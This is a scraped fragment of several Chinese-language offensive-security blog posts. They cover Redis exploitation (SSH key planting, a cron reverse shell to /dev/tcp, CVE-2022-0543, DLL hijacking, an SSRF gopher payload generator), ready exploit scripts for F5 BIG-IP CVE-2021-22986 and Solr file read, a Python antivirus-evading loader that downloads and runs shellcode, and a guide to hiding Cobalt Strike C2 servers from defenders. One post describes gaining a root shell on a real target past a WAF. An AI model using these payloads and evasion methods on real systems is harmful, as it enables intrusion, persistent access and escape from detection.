openssh 服务 sudo apt-get install openssh-server # 启动 ssh 服务 sudo /etc/init.d/ssh start # 配置 root 用户连接权限 sudo vim /etc/ssh/sshd_config PermitRootLogin yes # 设置允许通过免密登录 AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 # 重启 ssh 服务 sudo /etc/init.d/ssh restart #攻击机生成ssh密钥 ssh-keygen -t rsa cat /home/root/.ssh/id_rsa.pub #生成带有换行符的密钥并传入Redis (echo -e &quot;\\n\\n&quot;; cat /Users/sven/.ssh/id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; key.txt cat key.txt | ./redis-cli -h 192.168.0.104 -x set xxx #设置目录 config set dir /root/.ssh/ #设置文件名 set dbfilename authorized_keys #保存 save #连接目标服务器 ssh -i /Users/sven/.ssh/id_rsa root@192.168.0.104 设置.ssh目录的时候如果报错 (error) ERR Changing directory: No such file or directory 是靶机上不存在这个目录，原因是 .ssh 是记录密码信息的文件夹，如果 root 用户没有登录过的话，就没有 .ssh 文件夹，所以我们可以通过在靶机上运行这条命令 ssh localhost 或者手动创建 .ssh 目录，实际环境中不会发生此问题。 利用 Redis 写入Linux计划任务 1.漏洞原理 通过写入文件到系统计划任务目录 /var/spool/cron/root文件来执行，redis操作同写webshell，只是将一句话计划任务作为value，然后通过修改数据库的默认路径为/var/spool/cron/和默认的文件名root，把数据备份在root文件里，这样系统就会根据计划任务内容去运行命令。 2.利用场景 Redis 存在未授权访问或者暴破密码成功，最终连接Redis数据库成功的情况下，并且靶机出网（可访问攻击机），目标为centos系统，redis进程为高权限，可以设置计划任务。 3.利用过程 攻击机开启端口监听 nc -lvp 80 利用redis写入linux计划任务 set xxx &quot;\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/443 0&gt;&amp;1\\n&quot; //星号表示的是计划任务的时间，表示每分钟执行一次 config set dir /var/spool/cron/ config set dbfilename root save #计划任务参数说明 每分钟都执行一次的话就采用默认的 * * * * * 每五分钟执行一次可以 */5 * * * * 每两个小时执行一次的话就是 * */2 * * * 第三个*是日，第四个是月，第五个是周 m:分钟 - 从0到59的整数 h:小时 - 从0到23的整数 dom:天 - 从1到31的整数 (必须是指定月份的有效日期) mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示) command: 需要执行的命令 星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次 符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 Redis Lua沙盒绕过命令执行（CVE-2022-0543） 1.漏洞原理 Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。 2.利用场景 redis服务对外开放，未授权或已知密码，目标系统为Debian、Ubuntu 或其他基于 Debian 的 Linux 发行版系统，版本为 2.2 &lt;= redis &lt; 6.2.5。 3.利用过程 #本地复现环境拉取 git clone https://github.com/vulhub/vulhub.git cd vulhub/redis/CVE-2022-0543/ docker-compose up -d #连接redis，使用eval命令执行命令： eval 'local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res' 0 #值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。Vulhub环境（Ubuntu fiocal）中，这个路径是/usr/lib/x86_64-linux-gnu/liblua5.1.so.0 #若遇到不存在此.so文件，可以尝试从4.0遍历至7.0 0x06 Redis Windows漏洞利用 利用 Redis 主从复制 DLL劫持 Getshell 1.漏洞原理 利用redis的主从功能，写入dbghelp.dll文件，达到在redis执行BGSAVE或者BGREWRITEAOF命令时redis加载dll的目的 2.利用场景 Redis 存在未授权访问或者暴破密码成功，最终连接Redis数据库成功的情况下，并且是Windows系统下的Redis。 3.利用过程 #利用工具 https://github.com/r35tart/RedisWriteFile #上传制作好的dbghelp.dll python3 RedisWriteFile.py --rhost 10.100.18.218(目标机) --lhost 10.100.18.56(本机) --lfile dbghelp.dll --rfile dbghelp.dll #上传木马exe到C:\\\\Windows\\\\Temp目录，实战中exe自检exe是否处于免杀状态 python3 RedisWriteFile.py --rhost 10.100.18.218 --lhost 10.100.18.56 --lfile dbghelp.exe --rfile dbghelp.exe --rpath &quot;C:\\\\Windows\\\\Temp&quot; 制作劫持的dll #dll-hijacking下载地址 https://github.com/rek7/dll-hijacking python代码生成DLL劫持代码，替换导出路径dbghelp_为C:\\\\Windows\\\\System32\\\\dbghelp 在DLLMain函数中添加自己的shellcode执行逻辑，此处为调用另外一个木马exe(自行制作cs上线木马，优先使用免杀木马)作为演示，然后生成dll，名称改为dbghelp.dll 顺序是固定的，必须先上传dbghelp.dll，然后上传dbghelp.exe(木马的名字，任意名字都可，写死在dbghelp.dll中，自行更改)，否则将无法上传文件至redis目录。 连接redis，使用命令BGSAVE触发redis加载dbghelp.dll，从而成功运行dbghelp.exe木马上线CS 0x07 SSRF 对 Redis 的利用 dict协议 特点: 命令多条的话，需要一条条执行,不支持传入换行,也不会对%0d%0解码 格式: dict://serverip:port/命令:参数 gopher协议 特点: 支持多行输入，忽略首位字符串 格式: gopher://serverip:port/_data 无认证SSRF攻击 dict协议的攻击: 1.连接远程主服务器 curl dict://127.0.0.1:6379/slaveof:100.100.100.100:21000 2.设置保存文件名 curl dict://127.0.0.1:6379/config:set:dbfilename:exp.so 3.载入 exp.so curl dict://127.0.0.1:6379/module:load:./exp.so 4.断开主从 curl dict://127.0.0.1:6379/slaveof:no:one 5.恢复原始文件名 curl dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb 6.执行命令 curl dict://127.0.0.1:6379/system.exec:'whomai' 7.删除痕迹 curl dict://127.0.0.1:6379/system.exec:'rm ./exp.so' curl dict://127.0.0.1:6379/module:unload:system gopher协议的攻击: #采取Gopherus,实现快速利用，Gopherus内置了计划任务和写webshell两种利用方式 git clone https://github.com/tarunkant/Gopherus.git cd Gopherus python2 gopherus.py --exploit redis 有认证SSRF攻击 gopher协议的攻击 #密码设为123123 curl &quot;gopher://127.0.0.1:6379/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%36%0d%0a%31%32%33%31%32%33%%0d%0a&quot; 通用利用脚本 根据authPass参数有值无值区分redis是否需要认证，默认是主从利用代码，如webshell或者计划任务自行修改其中的redis命令即可 #!/usr/bin/python3 # -*-coding:utf-8-*- #参考文章:https://xz.aliyun.com/t/7974#toc-20 # author:xq17 import urllib.parse def tranToResp(x): xSplit = x.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(xSplit)) for i in xSplit: i = i.replace(&quot;${IFS}&quot;,&quot; &quot;) cmd+=&quot;\\r\\n&quot;+&quot;$&quot;+str(len(i))+&quot;\\r\\n&quot;+ i cmd+=&quot;\\r\\n&quot; return cmd def GeneratePayload(ip, port): cmd=[ &quot;config set dir ./&quot;, &quot;config set dbfilename exp.so&quot;, &quot;slaveof {i} {p}&quot;.format(i=ip, p=port), &quot;module load exp.so&quot;, &quot;system.exec ls&quot;, &quot;system.exec rm${IFS}exp.so&quot;, &quot;quit&quot;, ] # &quot;system.exec bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/192.168.8.103/4607${IFS}0&gt;&amp;1&quot;, payload = &quot;&quot; for p in cmd: payload += urllib.parse.quote(tranToResp(p)) return payload def main(): # target ip = &quot;10.100.8.231&quot; port = &quot;6379&quot; # server load exp.so serverIp = &quot;10.100.8.188&quot; serverPort = &quot;21000&quot; authPass = &quot;&quot; payload = GeneratePayload(serverIp, serverPort) exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) )) if authPass: print(&quot;author attack:&quot;) pd = &quot;gopher://{host}:{port}/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24{l}%0d%0a{p}%0d%0a&quot; pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass) print(pd + payload) print(&quot;clean footprint:&quot;) print(pd + exitPayload) else: print(&quot;no author attack:&quot;) pd = &quot;gopher://{host}:{port}/_&quot; print(pd.format(host=ip, port=port)+payload) print(&quot;clean footprint:&quot;) print(pd.format(host=ip, port=port) + exitPayload) if __name__ == '__main__': main() 0x08 Tips config命令禁用绕过 当redis.conf 配置了禁用config命令的时候。 rename-command CONFIG &quot;&quot; 比如这个config命令就不可用了，可以采取一种方式绕过。 这个时候我们就没办法自定义文件后缀了，但是我们还是可以利用主从复制的，主从同步文件后exp.so的内容被保存为了dump.rdb，把dump.rdb当做exp.so去正常加载即可。 module load ./dump.rdb 计划任务为何没有成功反弹shell 写计划任务反弹shell存在系统限制，这个方法只能Centos上使用，Ubuntu上行不通，原因如下： 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/&lt;username&gt;权限必须是600也就是-rw-------才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件/var/spool/cron/&lt;username&gt;权限644也能执行 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 由于系统的不同，crontrab定时文件位置也会不同 Centos的定时任务文件在/var/spool/cron/&lt;username&gt; Ubuntu定时任务文件在/var/spool/cron/crontabs/&lt;username&gt; Centos和Ubuntu均存在的（需要root权限）/etc/crontab PS：高版本的redis默认启动是redis权限，故写这个文件是行不通的 ","link":"https://www.svenbeast.com/post/g2K6Xk3IG/"},{"title":"一次\"绕\"过waf的经历","content":"0x01 描述 实战中遇到了2次这种绕过场景，第一次并没在意，以为可能是对面的waf或者部署方面有一定的问题 ，然后第二次也是同样方法，遂记录一下 0x02 第一次 1】是一次攻防演练中，一些扫描无果后，手工去排查一些网站，在排查到weblogic资产的时候，发现目标会在识别到一些敏感路径时回包reset，\b\b\b感觉有戏，因为(个人看法)存在这种waf，部分甲方本地自己人或者请乙方安全公司去进行安全测试时，如果在发现waf后，因为一些部门可能并不相通不好找人加白或者奇怪的心理(还要加白？是不是你们能力不行？)，很少会获得waf白名单的权利，而对waf开启状态的目标网站进行测试时，测试人员其实并不会去深究waf的绕过这些，\b\b\b\b最后获得结果就是: 漏洞存在，但测试结果是没有这个漏洞，获得网站安全的表面现象。 2】废话一箩筐凑字数别介意，然后就各种想办法，无果后，理了一下这个waf的拦截逻辑是：访问的url路径中存在历史漏洞中出现的漏洞利用路径就会重置链接，不针对weblogic，随便的利用链接像.svn这种也会拦，也就是说他是所有漏洞的利用url的黑名单，访问路径在黑名单内即重置链接。 3】求助了没什么好办法，想到sql注入有的场景是垃圾填充这些办法嘛，然后试着构造了超大的cookie包，大概是服务器本身就会拒绝链接的那种长度再短一点，发包后，哈哈，还是拒绝链接，不过他拒绝的比较慢，又想了一会，我想着再暴力一点，写了个多进程python脚本，附上weblogic漏洞利用的请求包带超大cookie的，然后100进程开启，过了10分钟收到了状态码200的回显\b，至此waf就过了 4】不过后面也很麻烦，负载均衡什么的，哈哈，设备多还是强的，后来演练结束后我去了解了一下目标的waf产品，是某明的天清xxx，当时觉得2种原因:可能是目标部署位置有问题导致有漏包，也可能是waf本身的一些设计问题或者版本不是最新，并没认为以后还会碰到这种绕过案例。 0x03 第二次 第一天 然后过了xx时间后，是帮朋友的一次不知道啥行动中，发现目标存在nc，bsh.servlet.BshServlet那个页面，那不直接就shell了，结果发现waf，逻辑是post包中存在 bsh.script= \b，就无法访问，虽然bp上不是直接显示reset，但是差不多，\b也是个白页面那种，绕了会也没绕过去，也是构造了个大包去跑，大包啥格式忘了，然后跑了10来分钟也没结果就关了 第二天 第一天收集了了一些资产，因为目标不少，就想着慢慢来，然后还是对那个nc不死心，去查了一下IBM的httpserver怎么解析http包，得知是提交多个相同还是不相同无法解析的参数时，最后一个参数是结果，具体并没理解，我只确认一件事是最后一个参数是漏洞参数就行了，然后弄个cookie大包，漏洞参数前放了其他的超大参数后120进程开跑，然后就去看其他资产了 过了不知道多长时间，只记得按小时计算，期间隔一段时间就看看发包结果，一直跑，最后下午6点左右吧，发现了有200回包，心中甚是欢喜，然后改成执行命令的post包，继续跑，然后几分钟很快就跑出来了，root权限，然后给朋友要了服务器ip，弹了shell。 0x04 1111 废话一堆，描述了一下心理活动，就是贫，有的时候吧，用一些时间做成了什么事情的时候很开心，很希望有个人可以分享，然后能一起开心，57uI56m25LiN6L+H5aWi5pyb572i5LqG77yM5pyJ55qE5Lq65oeS5b6X55CG5L2g77yM5pyJ55qE5Lq65oiW6K645Lya6auY5YW05LiA5LiL77yM5pyJ55qE5Lq65YW25a6e5LiN55+l6YGT5L2g5Zyo6K+05Liq5ZWl77yM5Zia5Zia6L+H5aS05LqG77yM5omA5Lul5ZGi77yMKioq55qE5a2m5bCx5a6M5LqL5LqG77yM5oGi5aSN5a2m5Lmg6YCf5bqm77yM5omp5bGV55+l6K+G5L2T57O75ZKM5rex5bqm77yB 1.\b\bcookie和提交参数垃圾填充+多线程疑似通用办法 2.\b\b个别服务器配置或者waf产品配置过高，需要一些时间才能生效 3.构造的包别影响最终解析 ","link":"https://www.svenbeast.com/post/XVarhy0Rd/"},{"title":"CobaltStrike的隐藏记录","content":"1. CobaltStrike的服务端隐藏 因为部分安全公司会不定时做全网的CobaltStrike服务端的识别，从而将IP标记为恶意服务器 因为一些网络测绘平台会检测CobaltStrike服务端的指纹，从而对服务器进行标记 为避免以上情况，所以需要对服务端的特征进行隐藏，与威胁情报相对抗 1.1 修改默认端口 打开teamserver，最后一行修改端口50050为其他端口 1.2 修改证书 删除cobaltstrike.store keytool -keystore ./cobaltstrike.store -storepass 设定一个密码 -keypass 刚才设定的密码 -genkey -keyalg RSA -alias baidu -dname &quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co., Ltd, L=beijing, S=beijing, C=CN&quot; 这样扫描这台的CS的server端占用端口的证书便无法确定运行的是CS 2. CobaltStrike的C2隐藏 在攻防演练中，某种情况下导致攻击被目标发现，目标会顺着线索继续溯源追踪到具体执行人，而我们的服务器也就变成溯源方的攻击目标之一，遂需要对我们使用的有关上线使用的线索进行隐藏,同样也是为了与威胁情况相对抗 2.1 申请免费域名 原因是免费域名无需备案，即使域名泄露也不会跟踪到注册人 通过freenom.com申请免费域名，无需实名 教程: https://zhuanlan.zhihu.com/p/115535965 将申请的域名转入dnspod下面进行管理(不转也行，dnspod为腾讯云计算公司全资控股) 教程: https://blog.csdn.net/weixin_46021924/article/details/104859155 创建一个A记录指向cs服务器 2.2 隐藏C2的具体IP 原因是隐藏后即使域名泄露，目标也不会知道具体C2的IP地址，无法发起对我们C2服务器的溯源攻击 2.2.1 方法1一利用heruko隐藏 - 暴露信息: 1.固定域名(heroku的) 2.随机IP(heroku的) - 优点: 1.服务端的域名隐藏 2.服务端的IP隐藏 3.布置简单 4.自带可信的SSL证书 5.免费 - 缺点: 1.上线速度慢 注册Heroku账号，点击 https://dashboard.heroku.com 通过gmail邮箱或者其他邮箱注册一个账号 然后部署应用，Fork的rootkit师傅项目，heruko的nginx代理部署链接，App name的名字自行设置，为一会heroku生成的域名的前缀，个别时候会heroku会识别不到项目，遇到的话需要自己fork用github登录heroku TARGET，填刚才申请的域名，端口自行设置 新建监听器1，域名填申请的域名，端口填heroku设置的target的端口 新建监听器2，端口设置443，域名为heroku的应用域名，点击open app查看域名 测试上线，随便生成个exe，监听器选择监听器2，运行上线，显示的上线监听器为监听器1 2.2.2 方法2—利用微林隐藏 - 暴露信息: 1.固定IP(微林的) - 优点: 1.服务端的域名隐藏 2.服务端的IP隐藏 3.上线速度快，只比用服务器IP慢2s左右 4.布置简单 - 缺点: 1.一点点钱 2.只能使用微林服务器固定IP上线（尝试用过域名解析指向，但是总被拦，内容显示非法阻断） 注册微林账号，https://www.vx.link，其他提供类似服务的平台也是可以使用的 购买包月套餐，最便宜的即可 配置微林 流量优化-为服务器添加授权（就是C2服务器） 流量优化-创建新的 vxTrans 链接点（配置转发） 设置域名解析(其实微林只是他有几台服务器然后转发你设置的端口的流量而已，他的IP也是固定的) 示例中我用的中国2这台，ping他的域名得知IP为182.118.xx.xx 新建监听器1，端口为微林转发到服务器设置的10000端口，域名为c2服务器自身IP 新建监听器2，域名填微林服务器IP 182.118.xx.xx，端口填微林转发到服务器设置的3xxxx端口 测试上线，随便生成个exe，监听器选择监听器2，运行上线，显示的上线监听器为监听器1 2.2.3 方法3—利用国外CDN隐藏 - 暴露信息: 1.固定域名(自己的免费域名) 2.随机IP(CDN厂商的) - 优点: 1.服务端的IP隐藏 2.免费 - 缺点: 1.上线速度慢 注册https://www.cloudflare.com/，按照网站教程为免费域名部署CDN 开启 缓存—开发者模式，否则无法执行命令，以后使用的时候也要检查是否开启，此项会不定时自动关闭 免费套餐限制了使用的端口， cloudflare可访问的端口](https://support.cloudflare.com/hc/zh-cn/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy) 注意生成的信息手动复制保存一下，xxx.pem,xxx.key 生成xxxxxx.p12 openssl pkcs12 -export -in xxx.pem -inkey xxx.key -out domain.p12 -name 免费域名 -passout pass:设定一个密码 生成新的cobaltstrike.store文件，我命名为new.store keytool -importkeystore -deststorepass 密码 -destkeypass 密码 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 密码 -alias 免费域名 配置C2.profile，附copy的一个配置文件，自行修改，填好后用c2lint c2.profile验证一下 git clone https://github.com/FortyNorthSecurity/C2concealer.git cd C2concealer ./install.sh C2concealer --variant 1 --hostname 免费域名 3 new.store的路径 new.store的密码 成功生成xxxx.profile c2lint xxxx.profile 确定这个配置文件是否能正常工作 修改teamserver配置 vim teamserver 最后一行找对应的改一下 -Djavax.net.ssl.keyStore=./new.store （证书生成的new.store文件地址） -Djavax.net.ssl.keyStorePassword=xxxxxx（上面store文件的密码） 创建监听器 测试上线，随便生成个exe，选择创建的监听器，运行上线，大概11秒主机上线 2.2.4 方法4—利用国内CDN隐藏 - 暴露信息: 1.固定域名 2.随机IP(CDN厂商的) - 优点: 1.高信域名 2.IP也是CDN的IP 3.上线速度快 - 缺点: 1.一点点钱 2.不能被CDN所属公司的溯源队伍碰到 使用腾讯云的全站加速举例 点击提交后，本地ping或者用站长之家的ping功能对腾讯云提供的CNAME那个域名进行ping，获得目标IP，这样就可以利用cdn使用host来识别请求域名来进行通信了 可以使用命令进行检查是否可以正常通信 curl -v -H &quot;Host: test1.baidu.com&quot; http://目标IP/test 然后新建一个监听，profile文件可以在网上找一个，把里面的host都改成cdn的域名 3. CobaltStrike的上线端隐藏 因为目标的安全建设多有一些流量监测设备和其他安全设备，会对CobaltStrike的上线流量进行指纹识别，从而进行报警拦截，根据暴露的域名或者主机，还会导致被溯源的几率大大增加。 故需要对上线端-&gt;服务端的特征进行隐藏，与溯源、威胁情报、IP封禁进行对抗 利用Profile配置文件对目标到C2之间的流量和证书进行自定义配置，达到尽量减少特征的目的，具体内容，鸽了鸽了。。毕竟是以前的笔记0.0 ","link":"https://www.svenbeast.com/post/ny5NkDd40/"},{"title":"CVE-2021-22986 F5 BIG-IP 未授权命令执行","content":"安装f5 BIG-IP,fq点击下载 然后双击.ova或者导入VirtualBox中打开虚拟机，设置一个强密码 诶嘿~ 。。我的安好了，特别小，可能是我屏幕分辨率太高的原因，也不太会用这个box 依次输入 root default default 123!@#qwe (随便设置一个强口令，否则无法通过) 获得IP,因为我的屏幕太小，所以用的ifconfig|more一行一行倒的 目标地址:https://192.168.0.107，尝试使用 admin/刚才设置的强口令进行登录，第一次登录让修改密码，照做便是。 Payload POST /mgmt/tm/util/bash HTTP/1.1 Host: 192.168.0.107 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.25.0 Authorization: Basic YWRtaW46c3YzbmJlYXN0 X-F5-Auth-Token: Content-Length: 42 Content-Type: application/json {&quot;utilCmdArgs&quot;: &quot;-c id&quot;, &quot;command&quot;: &quot;run&quot;} Exp import requests,sys,json from requests.auth import HTTPBasicAuth requests.packages.urllib3.disable_warnings() banner = ''' __ _____ ______ _____ _____ ___________ / _| ___| | ___ \\_ _| __ \\ |_ _| ___ \\\\ | |_|___ \\ | |_/ / | | | | \\/_____| | | |_/ / | _| \\ \\ | ___ \\ | | | | _|______| | | __/ | | /\\__/ / | |_/ /_| |_| |_\\ \\ _| |_| | |_| \\____/ \\____/ \\___/ \\____/ \\___/\\_| by 斯文 ''' def exp(url,cmd): try: session = requests.Session() rawBody = &quot;{{\\&quot;utilCmdArgs\\&quot;: \\&quot;-c {}\\&quot;, \\&quot;command\\&quot;: \\&quot;run\\&quot;}}&quot;.format(cmd) headers = {&quot;Accept&quot;:&quot;*/*&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;User-Agent&quot;:&quot;python-requests/2.25.0&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;X-F5-Auth-Token&quot;:&quot;&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;} response = session.post(&quot;{}/mgmt/tm/util/bash&quot;.format(url), data=rawBody,headers=headers, verify=False,auth=HTTPBasicAuth(&quot;admin&quot;,&quot;test&quot;)) result = json.loads(response.content) print(&quot;&gt;url: {}&quot;.format(url)) print(&quot;&gt;command: {}&quot;.format(cmd)) print(&quot;&gt;result: \\n\\n{}&quot;.format(result['commandResult'])) except Exception as e: # print(e) print(&quot;Not vul&quot;) if __name__ == &quot;__main__&quot;: print(banner) exp(sys.argv[1],sys.argv[2]) ","link":"https://www.svenbeast.com/post/6XXqeGdEj/"},{"title":"Solr 文件读取复现附EXP及个人Tips","content":"下载Solr cd solr-8.8.1/bin ./solr start -p 8989 然后add core cd /solr-8.8.1/server/solr/ mkdir newcore 复制 /solr-8.8.1/server/solr/configsets/_default的conf文件夹进入刚才创建的newcore文件夹 网页上点击Add Core 获得core名字 http://127.0.0.1:8989/solr/admin/cores?action=STATUS 打开 remote streaming curl -d '{ &quot;set-property&quot; : {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}' http://127.0.0.1:8989/solr/newcore/config -H 'Content-type:application/json' 进行文件读取 curl &quot;http://127.0.0.1:8989/solr/newcore/debug/dump?param=ContentStreams&quot; -F &quot;stream.url=file:////etc/passwd&quot; Exp : https://github.com/sv3nbeast/Solr-file_read import requests import sys,re,json import threadpool #from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings() banner = ''' _____ _ _____ _ / ____| | | | __ \\ | | | (___ ___ | |_ __ | |__) |___ __ _ __| | \\___ \\ / _ \\| | '__| | _ // _ \\/ _` |/ _` | ____) | (_) | | | | | \\ \\ __/ (_| | (_| | |_____/ \\___/|_|_| |_| \\_\\___|\\__,_|\\__,_| by 斯文 ''' def exp(url): try: dbName = getDb(url) if dbName: session = requests.Session() rawBody = &quot;{ \\&quot;set-property\\&quot; : {\\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\\&quot;:true}}&quot; headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Content-type&quot;:&quot;application/json&quot;,&quot;Accept&quot;:&quot;*/*&quot;} response = session.post(&quot;{}/solr/{}/config&quot;.format(url,dbName), data=rawBody, headers=headers) print(&quot;&gt;Core: {}&quot;.format(dbName)) while True: linux = File(url,dbName) try: print('&gt;result:\\n') if 'Permission' in str(linux): print('Permission denied\\n') continue if 'No such file or directory' in str(linux): print('No such file or directory\\n') continue linux = json.loads(linux) if linux['streams']: print(linux['streams'][0]['stream']) except: r = re.compile('''&lt;str name=&quot;stream&quot;&gt;(.*?)&lt;/str&gt;''') Str = re.findall(r,str(linux)) res = Str[0].replace('\\\\n','\\n') print(res + '\\n') except Exception as e: print(e) # print(&quot;Not vul&quot;) def File(url,dbName): session = requests.Session() paramsGet = {&quot;param&quot;:&quot;ContentStreams&quot;} path = input(&quot;&gt;Path: &quot;) paramsPost = {&quot;stream.url&quot;:&quot;file:///{}&quot;.format(path)} headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;} response = session.post(&quot;{}/solr/{}/debug/dump&quot;.format(url,dbName), data=paramsPost, params=paramsGet, headers=headers) return response.content def getDb(url): try: target = url + '/solr/admin/cores?action=STATUS' response = requests.get(target,verify=False,timeout=20) data = response.text if '关于全网部署360私有云的通知' in data: print('[- 蜜罐烦死啦!') return False try: r = re.compile('''&quot;status&quot;:{ &quot;(.*?)&quot;:{''') Str = re.findall(r,str(data)) dbName = Str[0] except: r = re.compile('''&lt;str name=&quot;name&quot;&gt;(.*?)&lt;/str&gt;''') Str = re.findall(r,str(data)) dbName = Str[0] except Exception as e: return False return dbName if __name__ == &quot;__main__&quot;: print(banner) exp(sys.argv[1]) Tips # Solr 文件读取深度利用 - 第一个 { 面板的-Djetty.home 路径}/solr/core名/conf/solrconfig.xml 结果搜 &quot;config&quot; 获得文件名字 - 第二个 /home/用户名/.bash_history - 第三个 /opt/solr/server/solr/configsets/_default/conf/solrconfig.xml 结果搜 &quot;config&quot; 获得数据库账号密码 - 第四个 直接读目录可以把目录下的文件都显示出来，类似命令ls - 第五个 此处支持SSRF，可考虑如何构造继续探测内网，比如redis PS: 老版本回显是xml格式，新版本是json格式，部分检测工具是没有覆盖全，我的工具没有这种问题 ","link":"https://www.svenbeast.com/post/320hjX2MI/"},{"title":"BypassAV的CS上线","content":"CS生成c语言的payload，取其中的shellcode，base64加密后放入shellcode.txt，放入公网vps的web服务中 shellcode=&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00' import ctypes,urllib.request,codecs,base64 shellcode = urllib.request.urlopen('http://ip/shellcode.txt').read() shellcode = shellcode.strip() shellcode = base64.b64decode(shellcode) shellcode =codecs.escape_decode(shellcode)[0] shellcode = bytearray(shellcode) ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))) handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) 上面代码复制后base64加密，放入loder.txt文件放入公网vps的web服务中 import pickle import ctypes,urllib.request,codecs,base64 sectr = urllib.request.urlopen('http://ip/loader.txt').read() sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;) class A(object): def __reduce__(self): return (exec, (sectr,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) ret_decode = base64.b64decode(ret_base64) pickle.loads(ret_decode) 上面代码改好vps的ip pyminifier --nonlatin --replacement-length=10 shellcode.py 使用此命令进行混淆，更换代码，有没有这步都行，保险加上 使用以下打包过程，目的是尽量压缩pyinstaller的单文件大小，效果明显，10m-&gt;6.多m ，仍然够大，但已经努力缩小了 pip3 install pipenv //安装虚拟环境，为了压缩打包文件大小 新建文件夹当做pipenv的目录，最好是根路径 pipenv install pipenv shell pip3 install 安装木马需要的模块和pyinstaller 同目录放入upx.exe pyinstaller -w -F --clean --key 8939usj8suxk2h3 -i ico.ico shellcode.py --key选项加不加都行，看个人喜好 总结一下: 2021·3·09 过火绒+360全家桶 卡巴斯基免费版不行，静态可以，执行就杀，内存杀得东南西北都不认得了 python+pyinstaller+upx+远程+混淆+无参，没有沙箱检测的代码，总感觉无参的可能存活时间不长，容易被360云沙箱标记，就看6m的大小360会不会自动上传吧 参考链接:https://blog.csdn.net/qq_40989258/article/details/113460218 ","link":"https://www.svenbeast.com/post/c5POOWPbA/"},{"title":"NAT规则滥用导致的内网代理","content":"今日份Study notes 目标网站时内网DMZ区的某个端口映射到公网服务器某个端口上 场景: 1.目标公网服务器111.111.111.111:8080，为内网192.168.0.108:8080映射出来的网站 2.目标公网服务器的8081端口同样设置了映射到内网的某个端口 很多企业的Web服务使用了NAT端口映射来转发内网的网站，这种情况还会让渗透的时候在获得权限后，发现目标无法出网，无法代理到内网流量，使用reGeorg或者Neo-reGeorg等http代理工具的话速度却无法令人满意 利用: 首先尝试扫描目标端口，以nmap为例，如果目标的某个端口，比如8081，扫描结果显示为close或者open，那么就可以直接使用socks5:111.111.111.111:8081来代理这台机器映射到的内网机器流量 目标存在着未被使用的端口映射 获得权限后手动结束占用NAT端口的进程（非必要情况最好不要结束） 原因 一般内网服务器映射公网的设置 利用iptables编写端口转发规则来达到内网服务转发公网的目的，然而有的时候设置的转发规则中的目标内网业务下线了，而NAT规则并没有一起删除，还有其他情况导致的此类NAT规则未删除，运行服务已停止的美妙场景 ps: 拜读倾旋师傅文章看到的，觉得有必要记小本本，且还未真实尝试，有待实战确认哦 ","link":"https://www.svenbeast.com/post/6_134ZiaS/"},{"title":"frp改造","content":"0x01 frp可优化的点 .ini配置文件泄露服务器信息 非TLS特征明显 frp 建立 TLS 连接的第一个字节为 0x17 客户端的留存的配置文件较敏感 0x02 优化 .ini配置文件泄露服务器信息 路径: /frp/pkg/msg/msg.go frpc在连接认证frps的时候回把frp的版本信息等等发给frps进行认证。 ``json:&quot;version&quot;修改为 